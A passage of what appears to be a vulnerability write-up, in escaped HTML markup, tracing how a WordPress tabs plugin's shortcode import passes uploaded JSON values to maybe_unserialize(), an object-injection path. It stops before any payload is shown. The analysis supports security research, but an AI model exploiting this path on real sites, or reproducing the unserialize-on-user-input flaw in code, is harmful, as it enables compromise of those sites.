class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_unslash&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;shortcode&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//phpcs:ignore&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;json_decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;json_decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;true&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The plugin decodes JSON twice. In the second call, &lt;code&gt;associative=true&lt;/code&gt; converts JSON objects into PHP arrays as described:&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition quote open disabled&#34;&gt;&#xD;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;/div&gt;&#xD;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;@param $associative: When true, JSON objects will be returned as associative arrays; when false, JSON objects will be returned as objects. When null, JSON objects will be returned as associative arrays or objects depending on whether JSON_OBJECT_AS_ARRAY is set in the flags.&lt;/p&gt;&lt;/div&gt;&#xD;&#xA;  &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&lt;p&gt;Then &lt;code&gt;import(&amp;ensp;$shortcodes&amp;ensp;)&lt;/code&gt; is called with &lt;code&gt;$shortcodes&lt;/code&gt; as &lt;code&gt;$data[&#39;shortcode&#39;]&lt;/code&gt;. Current JSON upload structure:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&#xA;&amp;ensp;&amp;ensp;&#34;shortcode&#34;: {}&#xA;}&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;import&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$shortcodes&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$errors&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$shortcodes&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;as&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$index&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$shortcode&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$errors&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$index&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$new_tabs_id&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;try&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$shortcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;meta&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;is_array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$shortcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;meta&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$shortcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;meta&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;as&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;sp_tab_source_options&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;===&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;||&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;sp_tab_shortcode_options&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;===&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$sanitize_value&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;sanitize_and_collect_metabox_data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;maybe_unserialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;str_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;{#ID#}&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$new_tabs_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;update_post_meta&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$new_tabs_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$sanitize_value&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Exception&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$e&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;array_push&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$errors&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$index&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getMessage&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;If&amp;ensp;there&amp;ensp;was&amp;ensp;a&amp;ensp;failure&amp;ensp;somewhere,&amp;ensp;clean&amp;ensp;up.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_trash_post&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$new_tabs_id&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$errors&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;reset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$errors&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$errors&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;WP_Error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;import_tabs_error&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$errors&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$shortcodes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The function loops through shortcodes and checks if &lt;code&gt;shortcode[&#39;meta&#39;]&lt;/code&gt; exists as an array; if so, it iterates over &lt;code&gt;$shortcode[&#39;meta&#39;]&lt;/code&gt;.&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$sanitize_value&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;sanitize_and_collect_metabox_data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;maybe_unserialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;str_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;{#ID#}&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$new_tabs_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If the key is &lt;code&gt;sp_tab_source_options&lt;/code&gt; or &lt;code&gt;sp_tab_shortcode_options&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Replace &lt;code&gt;{#ID#}&lt;/code&gt; in the value with &lt;code&gt;$new_tabs_id&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Call &lt;code&gt;maybe_unserialize()&lt;/code&gt; to decode serialized data&lt;/li&gt;&#xA;&lt;li&gt;Call &lt;code&gt;sanitize_and_collect_metabox_data()&lt;/code&gt; to sanitize and normalize data&lt;/li&gt;&#xA;&lt;li&gt;Finally, store the sanitized value using &lt;code&gt;update_post_meta()&lt;/code&gt; for post ID &lt;code&gt;$new_tabs_id&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Thus, the JSON structure to upload is:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&#xA;&amp;ensp;&amp;ensp;&#34;shortcode&#34;: 